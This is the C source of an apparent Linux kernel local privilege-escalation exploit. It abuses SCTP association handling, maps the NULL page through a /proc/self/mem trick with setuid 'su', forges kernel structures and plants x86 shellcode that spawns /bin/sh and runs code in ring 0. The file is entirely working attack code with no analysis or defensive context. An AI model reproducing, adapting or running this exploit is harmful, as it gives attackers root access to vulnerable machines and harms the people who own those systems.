#define _GNU_SOURE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <error.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/sctp.h>
#include <netinet/in.h>
#include <time.h> 
#include <malloc.h>
#include <sys/mman.h>
#include <err.h>

#define SERVER_PORT 6666

#define SCTP_GET_ASSOC_ID_LIST	29
#define SCTP_RESET_ASSOC	120
#define SCTP_ENABLE_RESET_ASSOC_REQ	0x02
#define SCTP_ENABLE_STREAM_RESET	118

struct sock
{
	char pad1[0x24];
	void *net;
	char pad[0x278];
	int type;
};

struct sctp_association
{
	char pad1[0x18];
	struct sock *sk;
	char pad2[0x34];
	char *ep;
	char pad3[0x158];
	int state;
};

void initexp()
{
	void *map = mmap((void*)0xa0000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS|MAP_GROWSDOWN|MAP_FIXED, -1, 0);
	if (map == MAP_FAILED) err(1, "mmap");
	strcpy(map,"jhh///sh/bin\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80");
	struct sctp_association * sctp_ptr = (struct sctp_association *)0xbc;
	sctp_ptr->sk = (struct sock *)0x1000;
	sctp_ptr->sk->type = 0x2;
	sctp_ptr->state = 0x7cc921c;
	sctp_ptr->ep = (char *)0x2000;
	*(sctp_ptr->ep + 0x8e) = 1;
	void **addr = (void **)0x3000;
	*addr = (void *)0x4000;
	memcpy(*addr,"1\xc0\xbf\xb1\xa2\x06\xc1\xff\xd7\xbf\xfd\x9f\x06\xc1\xff\xd7j{h\x00\x10\x00\x00h\x02\x02\x00\x00jsh\x00\x00\n\x00\xcf",0x80); // place this with your shellcode, it will run in ring0.
}

void mmapzero()
{
	void *map = mmap((void*)0x10000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS|MAP_GROWSDOWN|MAP_FIXED, -1, 0);
	if (map == MAP_FAILED) err(1, "mmap");
	int fd = open("/proc/self/mem", O_RDWR);
	if (fd == -1) err(1, "open");
	unsigned long addr = (unsigned long)map;
	while (addr != 0) {
		addr -= 0x1000;
		if (lseek(fd, addr, SEEK_SET) == -1) err(1, "lseek");
		char cmd[1000];
		sprintf(cmd, "LD_DEBUG=help su 1>&%d", fd);
		system(cmd);
	}
	printf("data at NULL: 0x%lx\n", *(unsigned long *)0);
}

void* client_func(void* arg)
{
	int socket_fd;
	struct sockaddr_in serverAddr;
	struct sctp_event_subscribe event_;
	struct sctp_sndrcvinfo sri;
	int s;

	char sendline[] = "butterfly";

	if ((socket_fd = socket(AF_INET, SOCK_SEQPACKET, IPPROTO_SCTP))==-1){
		perror("client socket");
		pthread_exit(0);
	}
	bzero(&serverAddr, sizeof(serverAddr));
	serverAddr.sin_family = AF_INET;
	serverAddr.sin_addr.s_addr = htonl(INADDR_ANY);
	serverAddr.sin_port = htons(SERVER_PORT);
	inet_pton(AF_INET, "127.0.0.1", &serverAddr.sin_addr);

	bzero(&event_, sizeof(event_));
	event_.sctp_data_io_event = 1;
	if(setsockopt(socket_fd,IPPROTO_SCTP,SCTP_EVENTS,&event_,sizeof(event_))==-1){
		perror("client setsockopt");
		goto client_out_;
	}

	sri.sinfo_ppid = 0;
	sri.sinfo_flags = 0;
	printf("sctp_sendmsg\n");
	if(sctp_sendmsg(socket_fd,sendline,sizeof(sendline),
		(struct sockaddr*)&serverAddr,sizeof(serverAddr),
		sri.sinfo_ppid,sri.sinfo_flags,sri.sinfo_stream,0,0)==-1){
		perror("client sctp_sendmsg");
		goto client_out_;
	}

client_out_:
	sleep(1);
  	close(socket_fd);
	pthread_exit(0);
}

void send_recv(int server_sockfd)
{
	int msg_flags;
	socklen_t len = sizeof(struct sockaddr_in);
	size_t rd_sz;
	char readbuf[20]="0";
	struct sctp_sndrcvinfo sri;
	struct sockaddr_in clientAddr;
	
	rd_sz = sctp_recvmsg(server_sockfd,readbuf,sizeof(readbuf),
	(struct sockaddr*)&clientAddr, &len, &sri, &msg_flags);
	
	sri.sinfo_flags = (1 << 6) | (1 << 2);
	printf("SENDALL.\n");
	if(sctp_sendmsg(server_sockfd,readbuf,0,(struct sockaddr*)&clientAddr,
		len,sri.sinfo_ppid,sri.sinfo_flags,sri.sinfo_stream, 0,0)<0){
		perror("SENDALL sendmsg");
	}
}

int server()
{
	int server_sockfd;
	//int messageFlags_;
	pthread_t tid;
	pthread_t close_thread;
	pthread_t send_recv_thread;
	struct sockaddr_in serverAddr;
	struct sctp_event_subscribe event_;

	//创建服务端SCTP套接字
	if ((server_sockfd = socket(AF_INET,SOCK_SEQPACKET,IPPROTO_SCTP))==-1){
		perror("socket");
		return 0;
	}
	bzero(&serverAddr, sizeof(serverAddr));
	serverAddr.sin_family = AF_INET;
	serverAddr.sin_addr.s_addr = htonl(INADDR_ANY);
	serverAddr.sin_port = htons(SERVER_PORT);
	inet_pton(AF_INET, "127.0.0.1", &serverAddr.sin_addr);

	//地址绑定
	if(bind(server_sockfd, (struct sockaddr*)&serverAddr,sizeof(serverAddr)) == -1){
		perror("bind");
		goto out_;
	}

	//设置SCTP通知事件
	bzero(&event_, sizeof(event_));
	event_.sctp_data_io_event = 1;
	if(setsockopt(server_sockfd, IPPROTO_SCTP,SCTP_EVENTS,&event_,sizeof(event_)) == -1){
		perror("setsockopt");
		goto out_;
	}

	//开始监听
	listen(server_sockfd,100);
	//创建线程，用于客户端链接
	printf("create client\n");
	if(pthread_create(&tid,NULL,client_func,NULL)){
		perror("pthread_create");
		goto out_;
	}
	//创建接收线程
	printf("server start\n");
	send_recv(server_sockfd);
out_:
	close(server_sockfd);
	return 0;
}

int main()
{
	mmapzero();
	initexp();
	server();
}
